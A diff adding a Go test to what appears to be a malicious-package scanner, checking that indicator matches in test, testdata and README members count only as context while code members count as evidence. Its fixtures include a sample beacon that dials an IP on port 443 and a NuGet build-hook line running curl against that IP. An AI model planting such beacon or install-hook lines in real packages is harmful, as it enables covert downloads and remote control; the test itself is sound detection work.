@@ -173,6 +173,53 @@ func TestAuditDataListRuleKeepsEndpoints(t *testing.T) {
 	}
 }
 
+// vdb-manager passes MatchText one blob per package, named after its manifest, with each member
+// after a `// ==== path ====` (Go, npm, cargo, packagist, maven), `# ==== path ====` (pypi,
+// rubygems, pub) or `<!-- ==== path ==== -->` (nuget) separator. A test, testdata or Markdown
+// member is tiered by its own path; the code members around it are not.
+func TestAuditConcatenatedMembersAreTieredByPath(t *testing.T) {
+	m := auditMatcher("185.220.101.5", "185.177.72.23", "45.137.21.9", "updater.py")
+	blob := "module github.com/acme/logwatch\n\ngo 1.22\n" +
+		"\n// ==== github.com/acme/logwatch@v1.2.0/parse_test.go ====\n" +
+		"\tline := `185.220.101.5 - - [19/May/2026:12:00:00 +0000] \"GET /wp-login.php HTTP/1.1\" 404 196 \"-\" \"python-requests/2.28\"`\n" +
+		"\n// ==== github.com/acme/logwatch@v1.2.0/testdata/access.log ====\n" +
+		"185.177.72.23 - - [02/Apr/2026:10:00:00 +0000] \"GET / HTTP/1.1\" 200 1000\n" +
+		"\n// ==== github.com/acme/logwatch@v1.2.0/README.md ====\n" +
+		"Blocks scanners such as 185.177.72.23 by default.\n" +
+		"\n// ==== github.com/acme/logwatch@v1.2.0/beacon.go ====\n" +
+		"\tconn, _ := net.Dial(\"tcp\", \"45.137.21.9:443\")\n"
+	ev := m.MatchText("github.com/acme/logwatch/go.mod", blob)
+	lines := splitLinesString(blob)
+	var evidence, context []string
+	for _, e := range ev {
+		if e.Class == detect.ClassContext {
+			context = append(context, lines[e.LineNumber-1])
+		} else {
+			evidence = append(evidence, lines[e.LineNumber-1])
+		}
+	}
+	if len(evidence) != 1 || !strings.Contains(evidence[0], "45.137.21.9") {
+		t.Errorf("only the beacon.go dial may be evidence; got %q", evidence)
+	}
+	if len(context) != 3 {
+		t.Errorf("the _test.go, testdata/ and README.md hits are recorded as context; got %q", context)
+	}
+
+	py := "from setuptools import setup\n" +
+		"\n# ==== acme-1.0/acme/core/updater.py ====\n" +
+		"URL = 'x'\n" +
+		"\n# ==== acme-1.0/tests/test_tor.py ====\n" +
+		"assert is_tor('185.220.101.5')\n"
+	ev = m.MatchText("acme/setup.py", py)
+	if got := evidenceLines(ev); len(got) != 0 {
+		t.Errorf("pypi separator file name or tests/ member yielded evidence on lines %v", got)
+	}
+	nuget := "<!-- ==== build/acme.targets ==== -->\n<Exec Command=\"curl http://45.137.21.9/x\" />\n"
+	if got := evidenceLines(m.MatchText("acme/install", nuget)); len(got) != 1 {
+		t.Errorf("an install-hook member must keep its evidence; got %v", got)
+	}
+}
+
 // A url indicator on a shared platform names one tenant's payload and keeps full weight, and a
 // tenant-named host on the same provider is not shared.
 func TestAuditSharedHostURLAndTenantHostsStillMatch(t *testing.T) {
